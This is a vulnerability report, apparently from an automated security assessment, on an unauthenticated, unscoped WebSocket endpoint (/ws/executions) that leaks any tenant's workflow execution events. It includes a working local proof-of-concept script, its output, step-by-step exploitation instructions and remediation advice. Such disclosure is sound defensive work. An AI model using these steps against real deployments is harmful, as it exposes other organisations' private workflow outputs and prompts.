# Unauthenticated, unscoped WebSocket gateway leaks any tenant's workflow execution events

**ID:** vuln-0020
**Severity:** HIGH
**Found:** 2026-11-21 04:11:20 UTC
**Target:** super-agent/backend
**CWE:** CWE-306
**CVSS:** 7.5
**Confidence:** High
**Fix Effort:** Medium

## Description

The WebSocket endpoint `/ws/executions` accepts unauthenticated connections and allows any client to subscribe to arbitrary workflow `executionId` values with no ownership or tenant check. Workflow node events — including full node output (`result.output`, e.g. LLM responses and tool results) — are then broadcast to that client, leaking any tenant's execution data to an unauthenticated network peer.

## Evidence

Local PoC output (isolated Fastify instance on 127.0.0.1 running the actual gateway module):

```text
📥 Client subscribed to execution victim-exec-123. Subscribers: 1
📡 Broadcast node:completed for execution victim-exec-123: 1 sent, 0 failed
received: [
 { "type": "subscribed", "executionId": "victim-exec-123" },
 { "type": "workflow_event", "event": { "type": "node:completed",
   "executionId": "victim-exec-123", "nodeId": "llm-node-1",
   "data": { "status": "finish", "result": { "secret": "SENSITIVE_AGENT_OUTPUT" } } } }
]
POC CONFIRMED: unauthenticated client received cross-execution event data
```

No Authorization header, query token, or any credentials were supplied by the client.

## Impact

An unauthenticated attacker who knows (or brute-forces/obtains) any execution UUID can stream that execution's live workflow events, including node results produced by LLM and tool nodes, across all organizations/tenants. This exposes other tenants' business data (workflow outputs, error messages, prompts echoed in results) in real time. It also lets an unauthenticated client hold arbitrary subscriptions, enabling resource consumption.

## Counterevidence

Checked for controls that could mitigate: (1) no global onRequest auth hook exists in app.ts — authentication is exclusively per-route preHandler, and the WS route registers none; (2) execution IDs are UUIDs, so an attacker must know/guess one — this raises difficulty but execution IDs appear in API responses to any org member and can be enumerated from prior executions; (3) no origin/Referer or token validation occurs anywhere in the gateway (searched whole file). Mitigation via obscurity of UUIDs is the only friction found; it does not prevent cross-tenant subscription when an ID is known.

## Confidence Rationale

Working local PoC against the actual gateway module plus a complete code trace showing no auth hook on the route and no ownership checks in handleSubscribe. Runtime validation used an isolated localhost instance (per assessment constraints), not the deployed service.

## What Would Change This Severity

Confirmation that execution IDs are high-entropy UUIDs never exposed cross-tenant and that the backend port is not network-reachable would lower severity; conversely, evidence that node results routinely contain credentials/PII would keep it high.

## Technical Analysis

`ExecutionWebSocketGateway.register()` (src/websocket/execution.gateway.ts:126-141) registers the route with only `{ websocket: true }` and no `preHandler`/auth. The backend applies authentication exclusively as a per-route `preHandler: [authenticate]` on REST routes; there is no global auth hook (verified in src/app.ts — only request-logging and audit onResponse hooks are global), so the WS route is unauthenticated. `handleConnection()` (line 155) never inspects the request. `handleSubscribe()` (lines 190-236) adds the client to `this.subscriptions` for any non-empty string `executionId` with no check that the execution belongs to the connecting user's organization. The bridge in src/setup/event-websocket-bridge.ts:46 forwards every `workflow:event` from `workflowExecutionService` — including `node:completed`/`node:paused` events whose `data.result` carries the full node output (`result.output`, src/services/workflow-execution.service.ts:459-483) — to all subscribers of that executionId.

## Proof of Concept

1. Start the backend (or a Fastify instance with the gateway registered) on a reachable host.
2. Open a WebSocket to `ws://<host>:<port>/ws/executions` with no Authorization header or token.
3. Send `{"type":"subscribe","executionId":"<any execution UUID>"}`.
4. Observe the server replies `{"type":"subscribed",...}` and subsequently delivers `workflow_event` messages containing that execution's node status and result data.

```js
// Local PoC (isolated, no external services): registers the real gateway on a
// throwaway Fastify instance and proves unauthenticated cross-execution subscription.
import Fastify from 'fastify';
import { WebSocket } from 'ws';
const { executionWebSocketGateway } = await import('./src/websocket/execution.gateway.ts');

const app = Fastify({ logger: false });
await executionWebSocketGateway.register(app);
await app.listen({ port: 0, host: '127.0.0.1' });
const port = app.server.address().port;

const ws = new WebSocket(`ws://127.0.0.1:${port}/ws/executions`); // NO credentials
const msgs = [];
ws.on('open', () => ws.send(JSON.stringify({ type: 'subscribe', executionId: 'victim-exec-123' })));
ws.on('message', (m) => msgs.push(JSON.parse(m.toString())));

setTimeout(() => executionWebSocketGateway.broadcastEvent({
  type: 'node:completed', executionId: 'victim-exec-123', nodeId: 'llm-node-1',
  data: { status: 'finish', result: { secret: 'SENSITIVE_AGENT_OUTPUT' } },
  timestamp: new Date(),
}), 300);

await new Promise((r) => setTimeout(r, 800));
const ok = msgs.some((m) => m.type === 'workflow_event' && m.event?.data?.result?.secret);
console.log(ok ? 'POC CONFIRMED' : 'POC FAILED');
ws.close(); await app.close(); executionWebSocketGateway.close();
```

## Remediation

Authenticate the WebSocket upgrade: validate the JWT (Authorization header or a short-lived one-time ticket issued by an authenticated REST endpoint) inside the `/ws/executions` handler before accepting the connection, and reject unauthenticated upgrades. On `subscribe`, look up the execution by ID scoped to the authenticated user's organization (e.g. `workflowExecutionService.getExecution(executionId, request.user.orgId)`) and reject subscriptions to executions the org does not own. Consider also validating origin headers for browser clients.

## Assumptions

Assumes the backend port is network-reachable by the attacker (deployment binds HOST 0.0.0.0 by default) and that executions carry sensitive node outputs, as the code shows result.output is included in broadcast events.
